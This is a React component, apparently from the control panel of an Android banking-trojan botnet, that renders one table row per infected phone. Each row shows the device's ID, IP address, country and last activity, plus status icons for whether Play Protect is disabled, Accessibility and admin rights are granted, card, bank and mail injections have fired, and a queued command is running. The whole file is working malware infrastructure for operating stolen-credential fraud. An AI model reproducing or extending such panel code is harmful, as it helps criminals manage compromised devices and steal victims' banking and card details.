import React from 'react';
import { isNullOrUndefined } from 'util';
import SettingsContext from '../../Settings';
import { try_eval } from '../../serviceF';
import EditCommentUniversal from '../EditCommentUniversal';

class BotsRow extends React.Component {

    state = {
        botId: "UNKNOWN UID",
        botAndroidVersion: "0.0.0",
        botTagsList: "NaN",
        botCountry: "not",
        botBanks: "none",
        statProtect: 0,
        statScreen: 0,
        statAccessibility: 0,
        statCards: 0,
        statBanks: 0,
        statMails: 0,
        statAdmin: 0,
        botLastActivity: "Unknown",
        comment: "",
        botAddDate: "Unknown Date",
        botIp: '0.0.0.0',
        WaitCommand: '',
        checked: false // Статус выбран ли этот бот (чекбокс)
    };

    updateBotInfo = () => {
        if(!isNullOrUndefined(this.props.botId)) {
            this.state.botId = this.props.botId;
            this.state.checked = (SettingsContext.SelectedBots.indexOf(this.props.botId) > -1);
        }

        // Имена пропсов, которые надо загнать в стейт (если они есть)
        let names = ['botAndroidVersion','botTagsList','botCountry','botBanks',
            'statProtect','statScreen','statAccessibility','statCards',
            'statBanks','statMails','statAdmin','comment',
            'botLastActivity','botAddDate','botIp','WaitCommand'];
        
        for(let name of names) {
            if(!isNullOrUndefined(this.props[name]))
                this.state[name] = this.props[name];
        }
    }

    toggleChange = () => {
        let botid = this.state.botId;
        let checkbox_status = (SettingsContext.SelectedBots.indexOf(botid) > -1);
        if(!checkbox_status) {
            SettingsContext.SelectedBots.push(botid);
            this.setState({checked: true});
        }
        else {
            SettingsContext.SelectedBots.remove(botid);
            this.setState({checked: false});
        }
    }

    lastActivityCalc() {
        if(this.state.botLastActivity < 60) {
            return "<span style='color:#00d400;'>" + this.state.botLastActivity + "s</span>";
        }
        else if(this.state.botLastActivity < 3600) {
            return "<span style='color:#efef00;'>" + parseInt(this.state.botLastActivity/60) + "m</span>";
        }
        else if(this.state.botLastActivity < 86400) {
            return "<span style='color:#ff9800;'>" + parseInt(this.state.botLastActivity/60/60) + "h</span>";
        }
        else {
            return "<span style='color:#f00000;'>" + parseInt(this.state.botLastActivity/60/60/24) + "d</span>";
        }
    }

    ServicesIcons() {
        let html = "<center style='line-height: 23px; font-size: 18px;'>";
        
        if(this.state.statScreen == 1) {
            html += "<i class=\"fa-yellow far fa-eye\" data-placement=\"bottom\" data-toggle=\"tooltip\" title=\"User looks at the screen\"></i>";
        }
        else {
            html += "<i class=\"fa-green far fa-eye-slash\" data-placement=\"bottom\" data-toggle=\"tooltip\" title=\"User does not look at the screen\"></i>";
        }
        html += ' ';
        if(this.state.statProtect == 0) {
            html += "<i class=\"fa-green far fa-shield\" data-placement=\"bottom\" data-toggle=\"tooltip\" title=\"Play Protect disabled\"></i>";
        }
        else if(this.state.statProtect == 2) {
            html += "<i class=\"fa-yellow fas fa-shield-alt\" data-placement=\"bottom\" data-toggle=\"tooltip\" title=\"Play Protect status not defined\"></i>";
        }
        else {
            html += "<i class=\"fa-red fas fa-shield-check\" data-placement=\"bottom\" data-toggle=\"tooltip\" title=\"Play Protect enabled\"></i>";
        }
        html += ' ';
        if(this.state.statAccessibility == 1) {
            html += "<i class=\"fa-green fas fa-universal-access\" data-placement=\"bottom\" data-toggle=\"tooltip\" title=\"Accessibility enabled\"></i>";
        }
        else {
            html += "<i class=\"fa-yellow fal fa-universal-access\" data-placement=\"bottom\" data-toggle=\"tooltip\" title=\"Accessibility disabled\"></i>";
        }

        html += '<br>';
        
        if(this.state.statCards == 1) {
            html += "<i class=\"fa-green far fa-money-check-alt\" data-placement=\"bottom\" data-toggle=\"tooltip\" title=\"СС Injection Triggered\"></i>";
        }
        else {
            html += "<i class=\"fa-yellow far fa-money-check-alt\" data-placement=\"bottom\" data-toggle=\"tooltip\" title=\"СС Injection not Triggered\"></i>";
        }
        html += ' ';
        if(this.state.statBanks == 1) {
            html += "<i class=\"fa-green far fa-piggy-bank\" data-placement=\"bottom\" data-toggle=\"tooltip\" title=\"Banks Injection Triggered\"></i>";
        }
        else {
            html += "<i class=\"fa-yellow far fa-piggy-bank\" data-placement=\"bottom\" data-toggle=\"tooltip\" title=\"Banks Injection not Triggered\"></i>";
        }
        html += ' ';
        if(this.state.statMails == 1) {
            html += "<i class=\"fa-green far fa-mailbox\" data-placement=\"bottom\" data-toggle=\"tooltip\" title=\"Mails Injection Triggered\"></i>";
        }
        else {
            html += "<i class=\"fa-yellow far fa-mailbox\" data-placement=\"bottom\" data-toggle=\"tooltip\" title=\"Mails Injection not Triggered\"></i>";
        }
        html += ' ';
        if(this.state.statAdmin == 1) {
            html += "<i class=\"fa-green fas fa-route-highway\" data-placement=\"bottom\" data-toggle=\"tooltip\" title=\"There are admin rights\"></i>";
        }
        else {
            html += "<i class=\"fa-red fas fa-route-highway\" data-placement=\"bottom\" data-toggle=\"tooltip\" title=\"no admin rights\"></i>";
        }

        html += '</center>';

        return html;
    }

    FaCheckBox() {
        return this.state.checked ? 'far fa-check-square' : 'far fa-square';
    }

    BanksCount(list)
    {
        try {
            return (list.split(':').length - 1).toString();
        }
        catch (err) {
            return err.toString();
        }
    }

    ChangeDefaultComment(newComment) {
        this.setState({
            comment: newComment
        });
    }

    render () {
        this.updateBotInfo();
        const td = {
            padding: '0px'
        };
        const tdw = {
            padding: '0px',
            width: '78px'
        }
        const CenterA = {
            textAlign: 'center',
            verticalAlign: 'middle',
            padding: '0px'
        }
        const BankStyle = {
            padding: '0px',
            textAlign: 'center',
            fontSize: '25px',
            lineHeight: '48px'
        }
        let CommentStyle = {
            padding: '5px'
        }

        return (
            <tr class={this.state.checked ? "checkedbotrow" : ""}>
                <td scope="col">{this.state.botId}</td>
                <td scope="col" style={CenterA}>{this.state.botAndroidVersion}</td>
                <td scope="col" style={CenterA}>{this.state.botTagsList}</td>
                <td scope="col" style={CenterA}><img src={"/img/flag/" + this.state.botCountry + ".png"} /></td>
                <td scope="col" style={CenterA} dangerouslySetInnerHTML={{__html:this.lastActivityCalc()}} />
                <td scope="col" style={td} dangerouslySetInnerHTML={{__html:this.ServicesIcons()}}/>
                <td scope="col" style={BankStyle}><i class="far fa-landmark" style={this.state.botBanks == '' ? ({color: 'red'}) : ({color: 'yellow'})}></i>{this.state.botBanks != '' ? <span class="badge badge-banks">{this.BanksCount(this.state.botBanks)}</span> : ''}</td>
                <td scope="col" style={CenterA}>{this.state.botIp}</td>
                <td scope="col" style={CenterA}>{this.state.botAddDate.split(' ')[0]}<br />{this.state.botAddDate.split(' ')[1]}</td>
                <td scope="col" style={CommentStyle}><EditCommentUniversal parentObj={this} idbot={this.state.botId} text={this.state.comment} request="editComment" /></td>
                <td scope="col" style={({width:'0px', color:'#47ad00'})}>{this.state.WaitCommand == '' ? '' : <i  data-placement="bottom" data-toggle="tooltip" title="Bot executes the command" class="far fa-terminal"></i>}</td>
                <td scope="col" style={tdw}>
                    <div class="check-bot">
                    <i class={this.FaCheckBox()} onClick={this.toggleChange.bind(this)} />
                    <i class="space-left far fa-info-circle" onClick={() => {
                        SettingsContext.CurrentSetBot = "";
                        SettingsContext.CurrentSetBot = this.state.botId;
                        try_eval('$("#BotInfoModal").modal("show");');
                        this.props.BotListForceUpdate();
                    }} />
                    <i class="space-left fal fa-cog" onClick={() => {
                        SettingsContext.CurrentSetBot = "";
                        SettingsContext.CurrentSetBot = this.state.botId;
                        try_eval('$("#BotSettingsModal").modal("show");');
                        this.props.BotListForceUpdate();
                    }} />
                    </div>
                </td>
            </tr>
        );
    }
}

export default BotsRow;